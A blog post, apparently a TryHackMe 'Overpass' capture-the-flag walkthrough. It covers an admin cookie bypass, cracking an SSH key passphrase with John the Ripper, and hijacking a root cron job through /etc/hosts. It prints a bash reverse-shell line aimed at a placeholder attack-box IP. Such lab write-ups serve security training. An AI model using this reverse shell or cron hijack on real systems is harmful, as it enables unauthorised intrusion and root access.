+++
title = 'TryHackMe — Overpass Writeup'
date = '2023-02-10'
draft = false
tags = ["TryHackMe", "Linux"]
summary = '“What happens when some broke CompSci students make a password manager?”'
[cover]
image = 'main.png'
+++

# Enumeration
To start off, we run an Nmap scan on the machine.

{{< figure src="image_1.png" align="center" >}}

From the scan, we can see that two ports are open, **80** and **22**.

Enumerating the site with [ffuf](https://github.com/ffuf/ffuf) gives us..

{{< figure src="image_2.png" align="center" >}}

# Getting the first flag
`/admin` looks interesting, checking out the page’s source code leads us to a file `login.js`.

{{< figure src="image_3.png" align="center" >}}

Looking at the `login()` function, we can see that if we have the “SessionToken” cookie, we’ll be able to access the admin panel.

Set the “SessionToken” cookie, changing the path to `/` and refresh the page.

{{< figure src="image_4.png" align="center" >}}

And we have access to the admin panel, which gives us a private key.

We can copy this key over to a file “id_rsa”, and use [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) to transform the key into a format that John The Ripper can use.

{{< figure src="image_5.png" align="center" >}}

After running John The Ripper on `id_rsa.hash`, we get the SSH password `james13` for the user **james** (see admin panel to find username).

Now we can SSH into the machine and get the first flag from `user.txt`.

{{< figure src="image_6.png" align="center" >}}

# Getting the second flag

Taking a look at `todo.txt` hints at a cron job running on the machine, we can find out what it is executing by listing `/etc/crontab`.

{{< figure src="image_7.png" align="center" >}}

The machine is getting `buildscript.sh` from **overpass.thm**, we can exploit this by modifying the `/etc/hosts` file, routing the machine to our attack box.

{{< figure src="image_8.png" align="center" >}}

Back on the attack box, create the directory `/downloads/src`, and inside it, the script `buildscript.sh`.

To exploit the machine, we need to inject a reverse shell into `buildscript.sh`, you can find some examples [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

We can use this simple reverse shell and add it to our script.

```bash
bash -i >& /dev/tcp/ATTACKBOX_IP/8080 0>&1
```

Next, make sure `buildscript.sh` is executable

```bash
chmod +x buildscript.sh
```

After we’re done, we need to start a Netcat listener on our attack box, make sure to start the listener on the same port used in the reverse shell, in this case, 8080.

{{< figure src="image_9.png" align="center" >}}

In order to make the script accessible to the machine, we can start a simple server using Python.

After the cron job executes, we can see the machine requesting the file from the attack box.

{{< figure src="image_10.png" align="center" >}}

Back to the Netcat listener, we have a shell!

The final flag is in `root.txt`.

{{< figure src="image_11.png" align="center" >}}